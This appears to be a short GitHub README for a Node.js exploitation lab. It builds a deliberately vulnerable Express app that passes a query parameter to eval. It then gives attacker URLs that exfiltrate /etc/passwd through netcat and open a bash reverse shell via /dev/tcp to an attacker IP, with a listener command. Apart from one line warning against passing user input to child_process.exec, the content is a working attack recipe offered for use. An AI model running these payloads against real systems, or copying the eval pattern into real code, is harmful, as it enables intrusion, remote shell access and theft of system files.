# NodeJS-Exploitation
Basic NodeJS Exploitation for data exfiltration and reverse shells

Node.js is an open-source, cross-platform, back-end, JavaScript runtime environment that executes JavaScript code outside a web browser.

child_process.exec() = Used to spawn a shell and execute system level commands
Never accept user input from the public and pass it to child_process.exec()

Basic Lab Setup

Victim IP   ::: 192.168.10.100

Attacker IP ::: 192.168.10.10

Victim 

Installing package dependencies
```
apt-get install nodejs
apt install nodejs-legacy
apt-get install npm
npm install express

```
Create new file called app.js with the below content
```
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});
app.listen(8080, function () {
    console.log('app listening on port 8080!');
});
```
Run the app
```
node app.js
```

Open the app
```
http://192.168.10.100:8080
```
Attacker

Pass it user input
```
http://192.168.10.100:8080/?q='Test'
```

Exfiltrate the /etc/passwd file of the remote system

```
http://192.168.10.100:8080/?q=require('child_process').exec('cat+/etc/passwd+|+nc+192.168.10.10+9999')

// Replace 192.168.10.10 & 9999 with your IP and Port
```

Obtain Reverse Shell

```
http://192.168.10.100:8080/?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.10.10/9999 0>%261"')

// Replace 192.168.10.10 & 9999 with your IP and Port

nc -lvnp 9999
```






